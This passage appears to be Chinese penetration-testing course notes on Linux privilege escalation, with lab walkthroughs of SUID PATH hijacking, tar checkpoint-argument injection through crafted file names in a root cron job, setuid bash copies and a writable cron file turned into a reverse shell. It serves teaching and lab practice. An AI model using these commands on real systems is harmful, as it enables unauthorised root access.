title="#系列内容："></a>#系列内容：</h3><p>内核，数据库，第三方服务，SUID&amp;GUID，定时任务，环境变量，SUDO，权限不当等</p><p>脏牛漏洞(CVE-2016-5195)</p><p>Dirty Pipe(CVE-2022-0847)</p><p>SUDO(CVE-2021-3156）</p><p>Polkit(CVE-2021-4034)</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a><strong>演示案例：</strong></h3><h4 id="➢-Linux-环境变量文件配合SUID-本地"><a href="#➢-Linux-环境变量文件配合SUID-本地" class="headerlink" title="➢ Linux-环境变量文件配合SUID-本地"></a><strong>➢ Linux-环境变量文件配合SUID-本地</strong></h4><h4 id="➢-Linux-定时任务打包配合SUID-本地"><a href="#➢-Linux-定时任务打包配合SUID-本地" class="headerlink" title="➢ Linux-定时任务打包配合SUID-本地"></a><strong>➢ Linux-定时任务打包配合SUID-本地</strong></h4><h4 id="➢-Linux-定时任务文件权限配置不当-WEB-amp-本地"><a href="#➢-Linux-定时任务文件权限配置不当-WEB-amp-本地" class="headerlink" title="➢ Linux-定时任务文件权限配置不当-WEB&amp;本地"></a><strong>➢ Linux-定时任务文件权限配置不当-WEB&amp;本地</strong></h4><h4 id="➢-Linux-第三方软件MYSQL数据库提权-WEB-amp-本地"><a href="#➢-Linux-第三方软件MYSQL数据库提权-WEB-amp-本地" class="headerlink" title="➢ Linux-第三方软件MYSQL数据库提权-WEB&amp;本地"></a><strong>➢ Linux-第三方软件MYSQL数据库提权-WEB&amp;本地</strong></h4></blockquote><h3 id="Linux-环境变量文件配合SUID-本地"><a href="#Linux-环境变量文件配合SUID-本地" class="headerlink" title="#Linux-环境变量文件配合SUID-本地"></a>#Linux-环境变量文件配合SUID-本地</h3><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423170947506.png" alt="image-20230423170947506"></p><h5 id="条件：ROOT用户对某个第三方程序给予了SUID权限"><a href="#条件：ROOT用户对某个第三方程序给予了SUID权限" class="headerlink" title="条件：ROOT用户对某个第三方程序给予了SUID权限"></a>条件：ROOT用户对某个第三方程序给予了SUID权限</h5><h5 id="探针具有suid权限的：find-x2F-user-root-perm-4000-print-2-gt-x2F-dev-x2F-null"><a href="#探针具有suid权限的：find-x2F-user-root-perm-4000-print-2-gt-x2F-dev-x2F-null" class="headerlink" title="探针具有suid权限的：find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null"></a>探针具有suid权限的：find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</h5><h5 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h5><h5 id="1、root用户讲可执行文件进行编译，保证文件的正常授权运行，给予ROOT权限执行"><a href="#1、root用户讲可执行文件进行编译，保证文件的正常授权运行，给予ROOT权限执行" class="headerlink" title="1、root用户讲可执行文件进行编译，保证文件的正常授权运行，给予ROOT权限执行"></a>1、root用户讲可执行文件进行编译，保证文件的正常授权运行，给予ROOT权限执行</h5><ul><li>gcc demo.c -o shell</li><li>chmod u+s shell</li></ul><h5 id="2、普通用户通过对文件反编译或源代码查看，覆盖其执行环境变量，直接让其执行指定程序获取权限"><a href="#2、普通用户通过对文件反编译或源代码查看，覆盖其执行环境变量，直接让其执行指定程序获取权限" class="headerlink" title="2、普通用户通过对文件反编译或源代码查看，覆盖其执行环境变量，直接让其执行指定程序获取权限"></a>2、普通用户通过对文件反编译或源代码查看，覆盖其执行环境变量，直接让其执行指定程序获取权限</h5><ul><li><p>cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;ps</p></li><li><p>export PATH&#x3D;&#x2F;tmp:$PATH</p></li><li><h5 id="（export-PATH-tmp-PATH-实际上是将-tmp-目录添加到-PATH-的最前面。这意味着，当你执行某个命令时，系统会先在-tmp-目录中查找对应的可执行文件，如果找不到再继续在-PATH-的其他目录中查找，-PATH是其他的环境变量目录）"><a href="#（export-PATH-tmp-PATH-实际上是将-tmp-目录添加到-PATH-的最前面。这意味着，当你执行某个命令时，系统会先在-tmp-目录中查找对应的可执行文件，如果找不到再继续在-PATH-的其他目录中查找，-PATH是其他的环境变量目录）" class="headerlink" title="（export PATH=/tmp:$PATH 实际上是将 /tmp 目录添加到 $PATH 的最前面。这意味着，当你执行某个命令时，系统会先在 /tmp 目录中查找对应的可执行文件，如果找不到再继续在 $PATH 的其他目录中查找，$PATH是其他的环境变量目录）"></a><strong><code>（export PATH=/tmp:$PATH 实际上是将 /tmp 目录添加到 $PATH 的最前面。这意味着，当你执行某个命令时，系统会先在 /tmp 目录中查找对应的可执行文件，如果找不到再继续在 $PATH 的其他目录中查找，$PATH是其他的环境变量目录）</code></strong></h5></li><li><p>.&#x2F;shell</p></li><li><p>id</p></li></ul><h6 id="比如有个domo-c文件，内容是用系统命令执行ps"><a href="#比如有个domo-c文件，内容是用系统命令执行ps" class="headerlink" title="比如有个domo.c文件，内容是用系统命令执行ps"></a>比如有个domo.c文件，内容是用系统命令执行ps</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423171102217.png" alt="image-20230423171102217"></p><h6 id="当系统执行ps时间，会默认执行bash下的ps"><a href="#当系统执行ps时间，会默认执行bash下的ps" class="headerlink" title="当系统执行ps时间，会默认执行bash下的ps"></a>当系统执行ps时间，会默认执行bash下的ps</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423172539332.png" alt="image-20230423172539332"></p><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423172028460.png" alt="image-20230423172028460"></p><h6 id="执行ps和执行bash-x2F-ps是一样的意思"><a href="#执行ps和执行bash-x2F-ps是一样的意思" class="headerlink" title="执行ps和执行bash&#x2F;ps是一样的意思"></a>执行ps和执行bash&#x2F;ps是一样的意思</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423172204592.png" alt="image-20230423172204592"></p><h6 id="gcc-demo-c-o-shell编译demo-c为shell，执行-x2F-shell，就相当于执行了ps命令"><a href="#gcc-demo-c-o-shell编译demo-c为shell，执行-x2F-shell，就相当于执行了ps命令" class="headerlink" title="gcc demo.c -o shell编译demo.c为shell，执行.&#x2F;shell，就相当于执行了ps命令"></a>gcc demo.c -o shell编译demo.c为shell，执行.&#x2F;shell，就相当于执行了ps命令</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423172520360.png" alt="image-20230423172520360"></p><h6 id="这里的逻辑是"><a href="#这里的逻辑是" class="headerlink" title="这里的逻辑是"></a>这里的逻辑是</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423172730578.png" alt="image-20230423172730578"></p><h6 id="在普通用户的权限下，执行cp-x2F-bin-x2F-bash-x2F-tmp-x2F-ps，将bash复制过来重命名问ps"><a href="#在普通用户的权限下，执行cp-x2F-bin-x2F-bash-x2F-tmp-x2F-ps，将bash复制过来重命名问ps" class="headerlink" title="在普通用户的权限下，执行cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;ps，将bash复制过来重命名问ps"></a>在普通用户的权限下，执行cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;ps，将bash复制过来重命名问ps</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423172821860.png" alt="image-20230423172821860"></p><h6 id="这时执行-x2F-ps和bash是同一个意思"><a href="#这时执行-x2F-ps和bash是同一个意思" class="headerlink" title="这时执行.&#x2F;ps和bash是同一个意思"></a>这时执行.&#x2F;ps和bash是同一个意思</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423173010552.png" alt="image-20230423173010552"></p><h6 id="但是这时，执行-x2F-shell还是相当于执行：ps，而不是-x2F-ps"><a href="#但是这时，执行-x2F-shell还是相当于执行：ps，而不是-x2F-ps" class="headerlink" title="但是这时，执行.&#x2F;shell还是相当于执行：ps，而不是.&#x2F;ps"></a>但是这时，执行.&#x2F;shell还是相当于执行：ps，而不是.&#x2F;ps</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423173131739.png" alt="image-20230423173131739"></p><h6 id="而之所以执行ps会直接调用是因为其在bash下，而bash是设置了环境变量的"><a href="#而之所以执行ps会直接调用是因为其在bash下，而bash是设置了环境变量的" class="headerlink" title="而之所以执行ps会直接调用是因为其在bash下，而bash是设置了环境变量的"></a>而之所以执行ps会直接调用是因为其在bash下，而bash是设置了环境变量的</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423173324456.png" alt="image-20230423173324456"></p><h6 id="所以将刚才的shell目录-x2F-tmp添加为环境变量"><a href="#所以将刚才的shell目录-x2F-tmp添加为环境变量" class="headerlink" title="所以将刚才的shell目录&#x2F;tmp添加为环境变量"></a>所以将刚才的shell目录&#x2F;tmp添加为环境变量</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423173428438.png" alt="image-20230423173428438"></p><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423173602047.png" alt="image-20230423173602047"></p><h6 id="现在执行-x2F-shell，直接会变成root权限"><a href="#现在执行-x2F-shell，直接会变成root权限" class="headerlink" title="现在执行.&#x2F;shell，直接会变成root权限"></a>现在执行.&#x2F;shell，直接会变成root权限</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423173648404.png" alt="image-20230423173648404"></p><h6 id="原理如下，会优先执行-x2F-tmp-x2F-目录下的ps"><a href="#原理如下，会优先执行-x2F-tmp-x2F-目录下的ps" class="headerlink" title="原理如下，会优先执行&#x2F;tmp&#x2F;目录下的ps"></a>原理如下，会优先执行&#x2F;tmp&#x2F;目录下的ps</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423173833416.png" alt="image-20230423173833416"></p><h6 id="如何发现"><a href="#如何发现" class="headerlink" title="如何发现"></a>如何发现</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423180651200.png" alt="image-20230423180651200"></p><h3 id="Linux-定时任务打包配合SUID-本地"><a href="#Linux-定时任务打包配合SUID-本地" class="headerlink" title="#Linux-定时任务打包配合SUID-本地"></a>#Linux-定时任务打包配合SUID-本地</h3><h5 id="提权通过获取计划任务执行文件信息进行提权"><a href="#提权通过获取计划任务执行文件信息进行提权" class="headerlink" title="提权通过获取计划任务执行文件信息进行提权"></a>提权通过获取计划任务执行文件信息进行提权</h5><h5 id="1、相对路径和绝对路径执行"><a href="#1、相对路径和绝对路径执行" class="headerlink" title="1、相对路径和绝对路径执行"></a>1、相对路径和绝对路径执行</h5><h5 id="2、计划任务命令存在参数调用"><a href="#2、计划任务命令存在参数调用" class="headerlink" title="2、计划任务命令存在参数调用"></a>2、计划任务命令存在参数调用</h5><h5 id="利用计划任务的备份功能tar命令的参数利用"><a href="#利用计划任务的备份功能tar命令的参数利用" class="headerlink" title="利用计划任务的备份功能tar命令的参数利用"></a>利用计划任务的备份功能tar命令的参数利用</h5><p>–checkpoint[&#x3D;NUMBER] 显示每个Numbers记录的进度消息（默认值为10）</p><p>–checkpoint-action&#x3D;ACTION 在每个checkpoint（检查点）上执行ACTION</p><ol><li>echo “” &gt; “–checkpoint-action&#x3D;exec&#x3D;sh test.sh”（创建一个名为 <code>--checkpoint-action=exec=sh test.sh</code> 的空文件，exec&#x3D;sh的意思是执行当前sh文件）</li><li>echo “” &gt; –checkpoint&#x3D;1  <strong>（–checkpoint&#x3D;n：每写入n个记录之后设置一个检查点，在检查点可以执行任意的操作，操作由–checkpoint-action指定）</strong></li><li>echo ‘cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;bash; chmod +s &#x2F;tmp&#x2F;bash’ &gt; test.sh</li><li>chmod +x test.sh</li><li><code>之所以在tmp目录是因为其默认所有用户都有执行权限</code></li><li><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424151102436.png" alt="image-20230424151102436"></li></ol><h6 id="1、比如定时打包一个文件夹里面的所有东西"><a href="#1、比如定时打包一个文件夹里面的所有东西" class="headerlink" title="1、比如定时打包一个文件夹里面的所有东西"></a>1、比如定时打包一个文件夹里面的所有东西</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423210907875.png" alt="image-20230423210907875"></p><h6 id="查看定时任务cat-etc-x2F-crontab"><a href="#查看定时任务cat-etc-x2F-crontab" class="headerlink" title="查看定时任务cat etc&#x2F;crontab"></a>查看定时任务cat etc&#x2F;crontab</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423211307097.png" alt="image-20230423211307097"></p><h6 id="打开tmp目录下的backup-sh文件，是打包的定时任务"><a href="#打开tmp目录下的backup-sh文件，是打包的定时任务" class="headerlink" title="打开tmp目录下的backup.sh文件，是打包的定时任务"></a>打开tmp目录下的backup.sh文件，是打包的定时任务</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423211432257.png" alt="image-20230423211432257"></p><h6 id="vim-etc-x2F-crontab-取消其前面的-号"><a href="#vim-etc-x2F-crontab-取消其前面的-号" class="headerlink" title="vim etc&#x2F;crontab,取消其前面的#号"></a>vim etc&#x2F;crontab,取消其前面的#号</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423211606949.png" alt="image-20230423211606949"></p><h6 id="等待一会，打包完成"><a href="#等待一会，打包完成" class="headerlink" title="等待一会，打包完成"></a>等待一会，打包完成</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423212116425.png" alt="image-20230423212116425"></p><h6 id="2、下面进行上面利用计划任务的备份功能tar命令的参数来操作，先创建上述的三个文件，再chmod-u-x-test-sh给test-sh赋予执行权限"><a href="#2、下面进行上面利用计划任务的备份功能tar命令的参数来操作，先创建上述的三个文件，再chmod-u-x-test-sh给test-sh赋予执行权限" class="headerlink" title="2、下面进行上面利用计划任务的备份功能tar命令的参数来操作，先创建上述的三个文件，再chmod u+x test.sh给test.sh赋予执行权限"></a>2、下面进行上面利用计划任务的备份功能tar命令的参数来操作，先创建上述的三个文件，再chmod u+x test.sh给test.sh赋予执行权限</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423220123472.png" alt="image-20230423220123472"></p><h6 id="继续把这个打包计时任务开启，其上面这个test-sh任务是关闭的"><a href="#继续把这个打包计时任务开启，其上面这个test-sh任务是关闭的" class="headerlink" title="继续把这个打包计时任务开启，其上面这个test.sh任务是关闭的"></a>继续把这个打包计时任务开启，其上面这个test.sh任务是关闭的</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423220616995.png" alt="image-20230423220616995"></p><h6 id="稍等一会，可以发现多了个压缩文件和bash文件"><a href="#稍等一会，可以发现多了个压缩文件和bash文件" class="headerlink" title="稍等一会，可以发现多了个压缩文件和bash文件"></a>稍等一会，可以发现多了个压缩文件和bash文件</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423220727752.png" alt="image-20230423220727752"></p><h6 id="执行bash，发现还是普通用户权限，bash本身不具有（suid）root权限，但是root赋予了bash只有在执行的时候才会有（suid）root权限"><a href="#执行bash，发现还是普通用户权限，bash本身不具有（suid）root权限，但是root赋予了bash只有在执行的时候才会有（suid）root权限" class="headerlink" title="执行bash，发现还是普通用户权限，bash本身不具有（suid）root权限，但是root赋予了bash只有在执行的时候才会有（suid）root权限"></a>执行bash，发现还是普通用户权限，bash本身不具有（suid）root权限，但是root赋予了bash只有在执行的时候才会有（suid）root权限</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423222551323.png" alt="image-20230423222551323"></p><h6 id="查看文档怎么利用，发现是要用-p参数"><a href="#查看文档怎么利用，发现是要用-p参数" class="headerlink" title="查看文档怎么利用，发现是要用-p参数"></a>查看文档怎么利用，发现是要用-p参数</h6><h6 id=""><a href="#" class="headerlink" title=""></a><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423221031782.png" alt="image-20230423221031782"></h6><h6 id="执行后获得root权限"><a href="#执行后获得root权限" class="headerlink" title="执行后获得root权限"></a>执行后获得root权限</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423223329756.png" alt="image-20230423223329756"></p><h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423233743681.png" alt="image-20230423233743681"></p><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424001934165.png" alt="image-20230424001934165"></p><h3 id="Linux-定时任务文件权限配置不当-WEB-amp-本地"><a href="#Linux-定时任务文件权限配置不当-WEB-amp-本地" class="headerlink" title="#Linux-定时任务文件权限配置不当-WEB&amp;本地"></a>#Linux-定时任务文件权限配置不当-WEB&amp;本地</h3><h5 id="利用不安全的权限分配操作导致的定时文件覆盖"><a href="#利用不安全的权限分配操作导致的定时文件覆盖" class="headerlink" title="利用不安全的权限分配操作导致的定时文件覆盖"></a>利用不安全的权限分配操作导致的定时文件覆盖</h5><h5 id="chmod-777-775-等-所有者-组-其他成员说明，导致所有人都可以将这个计时任务编辑内容，进行利用"><a href="#chmod-777-775-等-所有者-组-其他成员说明，导致所有人都可以将这个计时任务编辑内容，进行利用" class="headerlink" title="chmod 777 775 等 所有者 组 其他成员说明，导致所有人都可以将这个计时任务编辑内容，进行利用"></a>chmod 777 775 等 所有者 组 其他成员说明，导致所有人都可以将这个计时任务编辑内容，进行利用</h5><h6 id="比如修改为反弹命令"><a href="#比如修改为反弹命令" class="headerlink" title="比如修改为反弹命令"></a>比如修改为反弹命令</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424002539787.png" alt="image-20230424002539787"></p><h6 id="监听端口收到会话"><a href="#监听端口收到会话" class="headerlink" title="监听端口收到会话"></a>监听端口收到会话</h6><h3 id="Linux-第三方软件MYSQL数据库提权-WEB-amp-本地"><a href="#Linux-第三方软件MYSQL数据库提权-WEB-amp-本地" class="headerlink" title="#Linux-第三方软件MYSQL数据库提权-WEB&amp;本地"></a>#Linux-第三方软件MYSQL数据库提权-WEB&amp;本地</h3><p>靶场下载：<a 